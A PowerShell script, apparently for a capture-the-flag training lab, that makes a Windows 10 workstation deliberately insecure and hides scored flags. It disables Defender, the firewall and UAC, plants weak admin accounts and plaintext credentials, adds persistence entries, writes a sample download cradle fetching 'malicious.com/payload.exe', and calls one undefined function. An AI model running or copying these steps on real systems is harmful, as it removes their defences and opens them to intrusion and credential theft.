# Windows 10 Workstation Vulnerable Lab Configuration Script with CTF Flags
# WARNING: FOR ISOLATED LAB ENVIRONMENT ONLY - NEVER USE IN PRODUCTION
# This script intentionally creates security vulnerabilities and CTF flags for penetration testing practice

param(
    [string]$ServerName = "WIN2019-SRV",
    [string]$NetworkPrinter = "192.168.1.100",
    [string]$CommonPassword = "Password123!",
    [string]$TeamIdentifier = "CTF2024",
    [switch]$GenerateFlagReport
)

Write-Host "==========================================" -ForegroundColor Red
Write-Host "VULNERABLE WORKSTATION CONFIGURATION" -ForegroundColor Red
Write-Host "WITH CTF FLAG SYSTEM" -ForegroundColor Red
Write-Host "FOR EDUCATIONAL PURPOSES ONLY" -ForegroundColor Red
Write-Host "NEVER USE IN PRODUCTION ENVIRONMENTS" -ForegroundColor Red
Write-Host "==========================================" -ForegroundColor Red
Write-Host ""
$confirm = Read-Host "Type 'VULNERABLE' to confirm this is for an isolated lab"
if ($confirm -ne "VULNERABLE") { exit }

# Initialize flag tracking
$global:FlagList = @()
$global:FlagCounter = 1

# Function to generate and place flags
function New-CTFFlag {
    param(
        [string]$Location,
        [string]$Description,
        [int]$Points,
        [string]$Difficulty,
        [string]$Technique,
        [string]$FlagFormat = "FLAG"
    )
    
    $flagId = "{0:D3}" -f $global:FlagCounter
    $flag = "$FlagFormat{$TeamIdentifier-WS-$flagId}"
    
    $global:FlagList += [PSCustomObject]@{
        FlagID = $flagId
        Flag = $flag
        Location = $Location
        Description = $Description
        Points = $Points
        Difficulty = $Difficulty
        Technique = $Technique
        Hostname = hostname
    }
    
    $global:FlagCounter++
    return $flag
}

# Function to create vulnerable local users with flags
function Create-VulnerableUsers {
    Write-Host "Creating vulnerable user accounts with flags..." -ForegroundColor Yellow
    
    # Common local admin (matches server for lateral movement)
    New-LocalUser -Name "localadmin" -Password (ConvertTo-SecureString "admin123" -AsPlainText -Force) -PasswordNeverExpires -ErrorAction SilentlyContinue
    Add-LocalGroupMember -Group "Administrators" -Member "localadmin" -ErrorAction SilentlyContinue
    
    # User with flag in full name
    $userFlag = New-CTFFlag -Location "User Full Name" -Description "jsmith user Full Name field" -Points 10 -Difficulty "Easy" -Technique "User enumeration"
    
    # Additional weak users
    $users = @(
        @{Name="jsmith"; Password="Welcome1"; Groups=@("Users"); FullName="John Smith - $userFlag"},
        @{Name="mjones"; Password="Password1"; Groups=@("Users"); FullName="Mary Jones"},
        @{Name="developer"; Password="dev123"; Groups=@("Users"); FullName="Developer Account"},
        @{Name="helpdesk"; Password="help123"; Groups=@("Remote Desktop Users"); FullName="Help Desk"},
        @{Name="tempuser"; Password="temp"; Groups=@("Users"); FullName="Temporary User"}
    )
    
    foreach ($user in $users) {
        try {
            New-LocalUser -Name $user.Name -Password (ConvertTo-SecureString $user.Password -AsPlainText -Force) -FullName $user.FullName -PasswordNeverExpires -ErrorAction SilentlyContinue
            foreach ($group in $user.Groups) {
                Add-LocalGroupMember -Group $group -Member $user.Name -ErrorAction SilentlyContinue
            }
            Write-Host "  Created user: $($user.Name)" -ForegroundColor Green
        } catch {
            Write-Host "  User $($user.Name) already exists" -ForegroundColor Gray
        }
    }
    
    # Hidden user with flag name
    $hiddenUserFlag = New-CTFFlag -Location "Hidden User" -Description "Hidden user account" -Points 20 -Difficulty "Medium" -Technique "Advanced user enumeration"
    New-LocalUser -Name $hiddenUserFlag -Password (ConvertTo-SecureString "Hidden123!" -AsPlainText -Force) -Description "You found the hidden user!" -PasswordNeverExpires -ErrorAction SilentlyContinue
    
    # Enable Guest account
    Enable-LocalUser -Name "Guest" -ErrorAction SilentlyContinue
    
    # Set Administrator password
    Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString $CommonPassword -AsPlainText -Force)
    Enable-LocalUser -Name "Administrator"
}

# Function to disable Windows security
function Disable-WindowsSecurity {
    Write-Host "Disabling Windows security features..." -ForegroundColor Yellow
    
    # Disable Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    
    # Disable Windows Firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    
    # Disable UAC
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
    
    # Enable WDigest (stores credentials in memory)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 1
    
    # Disable LSA protection
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -Value 0 -ErrorAction SilentlyContinue
    
    # Allow blank passwords
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name "LimitBlankPasswordUse" -Value 0
    
    Write-Host "  Security features disabled" -ForegroundColor Green
}

# Function to create vulnerable file shares with flags
function Create-VulnerableShares {
    Write-Host "Creating vulnerable file shares with flags..." -ForegroundColor Yellow
    
    # Enable SMBv1
    Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -All -NoRestart -ErrorAction SilentlyContinue
    
    # Create shared folders
    $shares = @(
        @{Name="Users"; Path="C:\Users\Public\Documents"},
        @{Name="Downloads"; Path="C:\Users\Public\Downloads"},
        @{Name="WorkFiles"; Path="C:\WorkFiles"}
    )
    
    foreach ($share in $shares) {
        New-Item -Path $share.Path -ItemType Directory -Force -ErrorAction SilentlyContinue
        New-SmbShare -Name $share.Name -Path $share.Path -FullAccess "Everyone" -ErrorAction SilentlyContinue
        Write-Host "  Created share: $($share.Name)" -ForegroundColor Green
    }
    
    # Create sensitive files typical of workstation
    New-Item -Path "C:\Users\Public\Documents\Passwords" -ItemType Directory -Force
    
    # WiFi password file with flag
    $wifiFlag = New-CTFFlag -Location "WiFi Password File" -Description "wifi.txt in Documents" -Points 10 -Difficulty "Easy" -Technique "File searching"
    "WiFi Password: SecureWiFi2024!`nBackup Network: GuestWiFi2024`nFlag: $wifiFlag" | Out-File "C:\Users\Public\Documents\wifi.txt"
    
    # Email credentials with flag
    $emailFlag = New-CTFFlag -Location "Email Credentials" -Description "email.txt in Passwords folder" -Points 15 -Difficulty "Easy" -Technique "Credential harvesting"
    "Email: jsmith@company.com / Welcome1`nBackup: admin@company.com / $CommonPassword`n// $emailFlag" | Out-File "C:\Users\Public\Documents\Passwords\email.txt"
    
    # Hidden file with flag
    $hiddenFlag = New-CTFFlag -Location "Hidden File" -Description "Hidden .flag file in WorkFiles" -Points 25 -Difficulty "Medium" -Technique "Hidden file discovery"
    $hiddenFlag | Out-File "C:\WorkFiles\.flag" -Force
    attrib +h "C:\WorkFiles\.flag"
    
    # Create browser profile with saved passwords (simulate)
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    New-Item -Path $chromePath -ItemType Directory -Force -ErrorAction SilentlyContinue
    
    $browserFlag = New-CTFFlag -Location "Browser Data" -Description "Chrome Login Data" -Points 30 -Difficulty "Medium" -Technique "Browser credential extraction"
    "{`"passwords`":[{`"url`":`"http://internal-app`",`"username`":`"admin`",`"password`":`"admin123`",`"flag`":`"$browserFlag`"}]}" | Out-File "$chromePath\Login Data"
}

# Function to enable vulnerable RDP
function Configure-WorkstationRDP {
    Write-Host "Configuring vulnerable RDP access..." -ForegroundColor Yellow
    
    # Enable RDP
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    
    # Disable NLA
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
    
    # Add users to RDP group
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Users" -ErrorAction SilentlyContinue
    
    Write-Host "  RDP configured" -ForegroundColor Green
}

# Function to install vulnerable software with flags
function Install-VulnerableSoftware {
    Write-Host "Installing vulnerable software with flags..." -ForegroundColor Yellow
    
    # Create fake outdated software entries
    $softwarePath = "C:\Program Files\VulnerableSoftware"
    New-Item -Path $softwarePath -ItemType Directory -Force
    
    # Java 7 (simulated) with flag
    New-Item -Path "$softwarePath\Java7" -ItemType Directory -Force
    $javaFlag = New-CTFFlag -Location "Java Version File" -Description "Outdated Java installation" -Points 15 -Difficulty "Easy" -Technique "Software enumeration"
    "Outdated Java 7 - CVE vulnerabilities`nLicense: $javaFlag" | Out-File "$softwarePath\Java7\version.txt"
    
    # Flash Player (simulated)
    New-Item -Path "$softwarePath\Flash" -ItemType Directory -Force
    "Adobe Flash Player 10.0 - Multiple CVEs" | Out-File "$softwarePath\Flash\version.txt"
    
    # Old Office (simulated)
    New-Item -Path "$softwarePath\Office2003" -ItemType Directory -Force
    "Microsoft Office 2003 - Unpatched" | Out-File "$softwarePath\Office2003\version.txt"
    
    # Create unquoted service path vulnerability with flag
    New-Item -Path "C:\Program Files\Vulnerable App" -ItemType Directory -Force
    $serviceFlag = New-CTFFlag -Location "Unquoted Service Path" -Description "Vulnerable App service exploitation" -Points 35 -Difficulty "Hard" -Technique "Service path exploitation"
    "echo $serviceFlag > C:\flag_service_ws.txt" | Out-File "C:\Program Files\Vulnerable App\app.bat"
    
    # Register vulnerable service
    sc.exe create VulnAppService binpath= "C:\Program Files\Vulnerable App\app.bat" start= auto
    sc.exe config VulnAppService obj= "LocalSystem"
    
    Write-Host "  Vulnerable software installed with flags" -ForegroundColor Green
}

# Function to configure browser vulnerabilities
function Configure-BrowserVulnerabilities {
    Write-Host "Configuring browser vulnerabilities..." -ForegroundColor Yellow
    
    # Internet Explorer settings (less secure)
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1201" -Value 0 # Allow ActiveX
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1400" -Value 0 # Active scripting
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1001" -Value 0 # Download signed ActiveX
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1004" -Value 0 # Download unsigned ActiveX
    
    # Disable SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name SmartScreenEnabled -Value "Off" -ErrorAction SilentlyContinue
    
    # Create fake browser extensions folder with flag
    $extensionsPath = "$env:LOCALAPPDATA\BrowserExtensions"
    New-Item -Path $extensionsPath -ItemType Directory -Force
    
    $extFlag = New-CTFFlag -Location "Browser Extension" -Description "Malicious extension config" -Points 20 -Difficulty "Medium" -Technique "Browser analysis"
    "Malicious Extension Simulator`nAPI_KEY=$extFlag" | Out-File "$extensionsPath\evil.js"
    
    Write-Host "  Browser vulnerabilities configured" -ForegroundColor Green
}

# Function to create persistence mechanisms with flags
function Create-PersistenceMechanisms {
    Write-Host "Creating vulnerable persistence mechanisms with flags..." -ForegroundColor Yellow
    
    # Startup folder with flag
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $startupFlag = New-CTFFlag -Location "Startup Folder" -Description "Startup batch file" -Points 20 -Difficulty "Medium" -Technique "Persistence enumeration"
    "REM Startup Script`nREM Flag: $startupFlag`npowershell.exe -WindowStyle Hidden -Command `"Write-Host 'Vulnerable startup script'`"" | Out-File "$startupPath\update.bat"
    
    # Registry Run keys with flag
    $regFlag = New-CTFFlag -Location "Registry Run Key" -Description "HKCU Run key persistence" -Points 25 -Difficulty "Medium" -Technique "Registry persistence analysis"
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "cmd.exe /c echo $regFlag > C:\Windows\Temp\regflag.txt" -Force
    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "C:\ProgramData\update.exe" -Force
    
    # Scheduled task with stored credentials and flag
    $taskFlag = New-CTFFlag -Location "Scheduled Task" -Description "DailyUpdate task" -Points 25 -Difficulty "Medium" -Technique "Scheduled task analysis"
    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo $taskFlag > C:\temp\task_ws.txt"
    $trigger = New-ScheduledTaskTrigger -Daily -At 2am
    Register-ScheduledTask -TaskName "DailyUpdate" -Action $action -Trigger $trigger -User "localadmin" -Password "admin123" -RunLevel Highest -ErrorAction SilentlyContinue
    
    # WMI Event subscription (simulated) with flag
    $wmiFlag = New-CTFFlag -Location "WMI Backdoor" -Description "WMI event subscription" -Points 35 -Difficulty "Hard" -Technique "WMI persistence detection"
    New-Item -Path "C:\Windows\Temp\wmi_backdoor.txt" -Force
    "WMI Event Subscription Backdoor`nFlag: $wmiFlag" | Out-File "C:\Windows\Temp\wmi_backdoor.txt"
    
    Write-Host "  Persistence mechanisms created with flags" -ForegroundColor Green
}

# Function to configure network printer with flag
function Configure-SharedPrinter {
    param([string]$PrinterIP)
    
    Write-Host "Configuring shared printer with flag..." -ForegroundColor Yellow
    
    # Add printer port
    Add-PrinterPort -Name "IP_$PrinterIP" -PrinterHostAddress $PrinterIP -ErrorAction SilentlyContinue
    
    # Install printer
    Add-PrinterDriver -Name "Generic / Text Only" -ErrorAction SilentlyContinue
    
    # Printer flag in location field
    $printerFlag = New-CTFFlag -Location "Printer Configuration" -Description "Shared printer settings" -Points 15 -Difficulty "Easy" -Technique "Printer enumeration"
    
    Add-Printer -Name "SharedPrinter" -DriverName "Generic / Text Only" -PortName "IP_$PrinterIP" -Location $printerFlag -Shared -ShareName "SharedPrinter" -ErrorAction SilentlyContinue
    
    # Set weak permissions
    Set-Printer -Name "SharedPrinter" -PermissionSDDL "O:BAG:DUD:(A;OIIO;RPWPDTSDWD;;;WD)" -ErrorAction SilentlyContinue
    
    Write-Host "  Printer configured with flag" -ForegroundColor Green
}

# Function to store vulnerable credentials with flags
function Store-VulnerableCredentials {
    Write-Host "Storing vulnerable credentials with flags..." -ForegroundColor Yellow
    
    # Windows Credential Manager
    cmdkey /add:$ServerName /user:Administrator /pass:$CommonPassword
    cmdkey /add:fileserver /user:localadmin /pass:admin123
    cmdkey /add:*.company.local /user:jsmith /pass:Welcome1
    
    # Create credential files
    $credPath = "C:\Users\Public\Documents\Credentials"
    New-Item -Path $credPath -ItemType Directory -Force
    
    # VPN credentials with flag
    $vpnFlag = New-CTFFlag -Location "VPN Config" -Description "VPN configuration file" -Points 20 -Difficulty "Medium" -Technique "Configuration file analysis"
    "VPN Server: vpn.company.com`nUsername: jsmith`nPassword: Welcome1`nSecret: $vpnFlag" | Out-File "$credPath\vpn.txt"
    
    # Database credentials
    "Server=$ServerName;Database=HR;User Id=sa;Password=sa2019;" | Out-File "$credPath\database.config"
    
    # PowerShell credential object (serialized) with flag
    $psCredFlag = New-CTFFlag -Location "PowerShell Credential" -Description "Exported credential XML" -Points 25 -Difficulty "Medium" -Technique "Credential file analysis"
    $secureString = ConvertTo-SecureString "Password123!" -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential("Administrator", $secureString)
    $credential | Export-Clixml "$credPath\admin.xml"
    "<!-- Flag: $psCredFlag -->" | Out-File "$credPath\admin.xml" -Append
    
    # Sysprep answer file (common in corporate environments) with flag
    $sysprepFlag = New-CTFFlag -Location "Sysprep Unattend" -Description "Windows answer file" -Points 30 -Difficulty "Medium" -Technique "Unattend file analysis"
    $sysprepXml = @"
<unattend>
    <!-- Flag: $sysprepFlag -->
    <settings>
        <component>
            <autologon>
                <username>Administrator</username>
                <password>
                    <value>$CommonPassword</value>
                    <plaintext>true</plaintext>
                </password>
            </autologon>
        </component>
    </settings>
</unattend>
"@
    New-Item -Path "C:\Windows\Panther" -ItemType Directory -Force -ErrorAction SilentlyContinue
    $sysprepXml | Out-File "C:\Windows\Panther\unattend.xml"
    
    Write-Host "  Credentials stored in multiple locations with flags" -ForegroundColor Green
}

# Function to create vulnerable documents with flags
function Create-VulnerableDocuments {
    Write-Host "Creating vulnerable documents with flags..." -ForegroundColor Yellow
    
    $docPath = "C:\Users\Public\Documents\Important"
    New-Item -Path $docPath -ItemType Directory -Force
    
    # Create fake macro-enabled documents with flags
    $macroFlag = New-CTFFlag -Location "Macro Document" -Description "Invoice.docm macro" -Points 15 -Difficulty "Easy" -Technique "Document analysis"
    "This document contains macros that run automatically`nMacro Code: Sub AutoOpen()`n' Flag: $macroFlag`nEnd Sub" | Out-File "$docPath\Invoice.docm"
    
    "Enable macros to view this spreadsheet" | Out-File "$docPath\Report.xlsm"
    
    # Create HTA file with flag
    $htaFlag = New-CTFFlag -Location "HTA File" -Description "Portal.hta application" -Points 25 -Difficulty "Medium" -Technique "HTA analysis"
    $htaContent = @"
<html>
<head>
<!-- Flag: $htaFlag -->
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "cmd.exe /c echo Vulnerable HTA executed > C:\temp\hta.txt", 0, True
</script>
</head>
<body>
    <h1>Company Portal</h1>
</body>
</html>
"@
    $htaContent | Out-File "$docPath\portal.hta"
    
    # Create PowerShell download cradle with flag
    $ps1Flag = New-CTFFlag -Location "PowerShell Script" -Description "Update.ps1 download cradle" -Points 20 -Difficulty "Medium" -Technique "Script analysis"
    $ps1Content = @"
# Vulnerable PowerShell Script
# Flag: $ps1Flag
`$url = "http://malicious.com/payload.exe"
`$output = "C:\Temp\update.exe"
Invoke-WebRequest -Uri `$url -OutFile `$output
Start-Process `$output
"@
    $ps1Content | Out-File "$docPath\update.ps1"
    
    Write-Host "  Vulnerable documents created with flags" -ForegroundColor Green
}

# Function to create DLL hijacking vulnerabilities with flags
function Create-DLLHijackingVulnerabilities {
    Write-Host "Creating DLL hijacking opportunities with flags..." -ForegroundColor Yellow
    
    # Create writable PATH directories
    $hijackPath = "C:\ProgramData\Custom"
    New-Item -Path $hijackPath -ItemType Directory -Force
    icacls $hijackPath /grant Everyone:F /T
    
    # DLL hijacking flag
    $dllFlag = New-CTFFlag -Location "DLL Hijack Path" -Description "Writable PATH directory" -Points 35 -Difficulty "Hard" -Technique "DLL hijacking"
    "REM DLL Hijacking POC`nREM Flag: $dllFlag" | Out-File "$hijackPath\readme.txt"
    
    # Add to PATH
    $currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
    [Environment]::SetEnvironmentVariable("Path", "$hijackPath;$currentPath", "Machine")
    
    # Create service with missing DLL
    New-Item -Path "C:\Services\VulnService" -ItemType Directory -Force
    icacls "C:\Services\VulnService" /grant Everyone:F /T
    
    Write-Host "  DLL hijacking vulnerabilities created with flag" -ForegroundColor Green
}

# Function to create clipboard flag
function Create-ClipboardFlag {
    Write-Host "Creating clipboard flag..." -ForegroundColor Yellow
    
    $clipFlag = New-CTFFlag -Location "Clipboard" -Description "Current clipboard contents" -Points 15 -Difficulty "Easy" -Technique "Clipboard monitoring"
    Set-Clipboard -Value $clipFlag
    
    Write-Host "  Clipboard flag created" -ForegroundColor Green
}

# Function to create recycle bin flag
function Create-RecycleBinFlag {
    Write-Host "Creating recycle bin flag..." -ForegroundColor Yellow
    
    $recycleFlag = New-CTFFlag -Location "Recycle Bin" -Description "Deleted file in recycle bin" -Points 20 -Difficulty "Medium" -Technique "Deleted file recovery"
    
    # Create and delete a file to put in recycle bin
    $tempFile = "C:\Users\Public\Documents\deleted_flag.txt"
    $recycleFlag | Out-File $tempFile
    
    # Move to recycle bin
    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile($tempFile,'OnlyErrorDialogs','SendToRecycleBin')
    
    Write-Host "  Recycle bin flag created" -ForegroundColor Green
}

# Function to create sticky notes flag
function Create-StickyNotesFlag {
    Write-Host "Creating sticky notes flag..." -ForegroundColor Yellow
    
    $stickyFlag = New-CTFFlag -Location "Sticky Notes" -Description "Windows Sticky Notes" -Points 25 -Difficulty "Medium" -Technique "Note application analysis"
    
    $stickyPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState"
    New-Item -Path $stickyPath -ItemType Directory -Force -ErrorAction SilentlyContinue
    
    # Create plum.sqlite (Sticky Notes database)
    "SQLite format 3`nSticky Note: Remember the flag is $stickyFlag" | Out-File "$stickyPath\plum.sqlite"
    
    Write-Host "  Sticky notes flag created" -ForegroundColor Green
}

# Function to create DPAPI flag
function Create-DPAPIFlag {
    Write-Host "Creating DPAPI protected flag..." -ForegroundColor Yellow
    
    $dpapiFlag = New-CTFFlag -Location "DPAPI Blob" -Description "DPAPI encrypted data" -Points 40 -Difficulty "Hard" -Technique "DPAPI decryption"
    
    # Encrypt with DPAPI
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($dpapiFlag)
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    
    # Save encrypted blob
    [System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\dpapi_flag.bin", $encrypted)
    
    # Also create a hint file
    "This file contains DPAPI encrypted data. Decrypt it to find the flag!" | Out-File "C:\Users\Public\Documents\dpapi_flag_README.txt"
    
    Write-Host "  DPAPI flag created" -ForegroundColor Green
}

# Function to create Office recent documents flag
function Create-OfficeRecentFlag {
    Write-Host "Creating Office recent documents flag..." -ForegroundColor Yellow
    
    $recentFlag = New-CTFFlag -Location "Office Recent Docs" -Description "Recent Office documents" -Points 20 -Difficulty "Medium" -Technique "Office history analysis"
    
    # Create Office recent files registry entries
    $officePath = "HKCU:\Software\Microsoft\Office\16.0\Word\File MRU"
    New-Item -Path $officePath -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path $officePath -Name "Item 1" -Value "C:\Secret\$recentFlag.docx" -Force
    
    Write-Host "  Office recent documents flag created" -ForegroundColor Green
}

# Function to create Windows Search index flag
function Create-SearchIndexFlag {
    Write-Host "Creating Windows Search index flag..." -ForegroundColor Yellow
    
    $searchFlag = New-CTFFlag -Location "Search Index" -Description "Windows Search database" -Points 30 -Difficulty "Hard" -Technique "Search index analysis"
    
    # Create a file that will be indexed
    $searchFile = "C:\Users\Public\Documents\indexed_secret.txt"
    "This secret document contains sensitive information: $searchFlag" | Out-File $searchFile
    
    # Force indexing (note: actual indexing takes time)
    Start-Process "C:\Windows\System32\SearchProtocolHost.exe" -ArgumentList "/Catalogs" -WindowStyle Hidden -ErrorAction SilentlyContinue
    
    Write-Host "  Search index flag created" -ForegroundColor Green
}

# Function to configure server connection
function Configure-ServerConnection {
    param([string]$Server)
    
    Write-Host "Configuring connection to server..." -ForegroundColor Yellow
    
    # Map network drive
    net use Z: \\$Server\Public /persistent:yes 2>$null
    
    # Add server to trusted hosts
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value $Server -Force -ErrorAction SilentlyContinue
    
    # Create shortcut to server shares with flag in comments
    $shortcutFlag = New-CTFFlag -Location "Desktop Shortcut" -Description "Server shortcut properties" -Points 10 -Difficulty "Easy" -Technique "Shortcut analysis"
    
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("$env:PUBLIC\Desktop\Server Shares.lnk")
    $Shortcut.TargetPath = "\\$Server"
    $Shortcut.Description = "Connect to server - Flag: $shortcutFlag"
    $Shortcut.Save()
    
    Write-Host "  Server connection configured" -ForegroundColor Green
}

# Function to generate flag documentation
function Generate-FlagReport {
    Write-Host "`nGenerating flag report..." -ForegroundColor Cyan
    
    $reportPath = "C:\CTF_FLAGS_WORKSTATION_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
    
    $html = @"
<!DOCTYPE html>
<html>
<head>
    <title>CTF Flag Report - Workstation - $(hostname)</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #f0f0f0; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        h1 { color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #4CAF50; color: white; padding: 12px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #ddd; }
        tr:hover { background: #f5f5f5; }
        .easy { color: green; font-weight: bold; }
        .medium { color: orange; font-weight: bold; }
        .hard { color: red; font-weight: bold; }
        .stats { background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .flag-code { font-family: 'Courier New'; background: #f0f0f0; padding: 2px 5px; border-radius: 3px; }
        .hint { background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>CTF Flag Report - Windows 10 Workstation</h1>
        <div class="hint">
            <strong>Note:</strong> This is the WORKSTATION flag report. Flags here use the format FLAG{$TeamIdentifier-WS-XXX}
        </div>
        
        <div class="stats">
            <h2>Workstation Statistics</h2>
            <p><strong>Hostname:</strong> $(hostname)</p>
            <p><strong>Total Flags:</strong> $($global:FlagList.Count)</p>
            <p><strong>Total Points:</strong> $(($global:FlagList | Measure-Object -Property Points -Sum).Sum)</p>
            <p><strong>Easy Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Easy'}).Count)</p>
            <p><strong>Medium Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Medium'}).Count)</p>
            <p><strong>Hard Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Hard'}).Count)</p>
            <p><strong>Report Generated:</strong> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</p>
        </div>
        
        <h2>Workstation-Specific Flag Locations</h2>
        <ul>
            <li>Browser profiles and saved credentials</li>
            <li>User documents and downloads</li>
            <li>Sticky Notes and clipboard</li>
            <li>Recycle Bin and deleted files</li>
            <li>DPAPI encrypted data</li>
            <li>Office recent documents</li>
            <li>Local user profiles</li>
        </ul>
        
        <h2>Flag Details</h2>
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Flag</th>
                    <th>Location</th>
                    <th>Description</th>
                    <th>Points</th>
                    <th>Difficulty</th>
                    <th>Technique</th>
                </tr>
            </thead>
            <tbody>
"@
    
    foreach ($flag in $global:FlagList | Sort-Object FlagID) {
        $difficultyClass = $flag.Difficulty.ToLower()
        $html += @"
                <tr>
                    <td>$($flag.FlagID)</td>
                    <td class="flag-code">$($flag.Flag)</td>
                    <td>$($flag.Location)</td>
                    <td>$($flag.Description)</td>
                    <td>$($flag.Points)</td>
                    <td class="$difficultyClass">$($flag.Difficulty)</td>
                    <td>$($flag.Technique)</td>
                </tr>
"@
    }
    
    $html += @"
            </tbody>
        </table>
        
        <h2>Attack Path Suggestions</h2>
        <ol>
            <li><strong>Initial Access:</strong> Try password spraying common credentials against RDP</li>
            <li><strong>User Enumeration:</strong> List local users and check their properties</li>
            <li><strong>File Search:</strong> Search for sensitive files in user directories and shares</li>
            <li><strong>Browser Analysis:</strong> Extract saved passwords and browsing history</li>
            <li><strong>Privilege Escalation:</strong> Check for unquoted service paths and weak permissions</li>
            <li><strong>Persistence Review:</strong> Examine startup locations and scheduled tasks</li>
            <li><strong>Lateral Movement:</strong> Use found credentials to access the server</li>
        </ol>
        
        <h2>Workstation-Specific Tools</h2>
        <ul>
            <li><strong>LaZagne:</strong> Extract passwords from browsers, WiFi, etc.</li>
            <li><strong>Seatbelt:</strong> Comprehensive workstation enumeration</li>
            <li><strong>SharpUp:</strong> Privilege escalation enumeration</li>
            <li><strong>PowerUp:</strong> PowerShell privilege escalation checks</li>
            <li><strong>Mimikatz:</strong> Credential extraction from memory</li>
        </ul>
    </div>
</body>
</html>
"@
    
    $html | Out-File $reportPath -Encoding UTF8
    
    # Also create a CSV for easier parsing
    $csvPath = $reportPath -replace '\.html$', '.csv'
    $global:FlagList | Export-Csv -Path $csvPath -NoTypeInformation
    
    Write-Host "  Flag report saved to: $reportPath" -ForegroundColor Green
    Write-Host "  CSV report saved to: $csvPath" -ForegroundColor Green
    
    return $reportPath
}

# Main execution
Write-Host "`nStarting vulnerable workstation configuration with CTF flags..." -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

# Run all configuration functions
Create-VulnerableUsers
Disable-WindowsSecurity
Create-VulnerableShares
Configure-WorkstationRDP
Install-VulnerableSoftware
Configure-BrowserVulnerabilities
Create-PersistenceMechanisms
Configure-SharedPrinter -PrinterIP $NetworkPrinter
Store-VulnerableCredentials
Enable-LegacyProtocols
Create-VulnerableDocuments
Create-DLLHijackingVulnerabilities
Configure-ServerConnection -Server $ServerName
Create-ClipboardFlag
Create-RecycleBinFlag
Create-StickyNotesFlag
Create-DPAPIFlag
Create-OfficeRecentFlag
Create-SearchIndexFlag

# Additional workstation-specific vulnerabilities
Write-Host "`nApplying additional workstation misconfigurations..." -ForegroundColor Yellow

# AutoLogon for user
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value "jsmith"
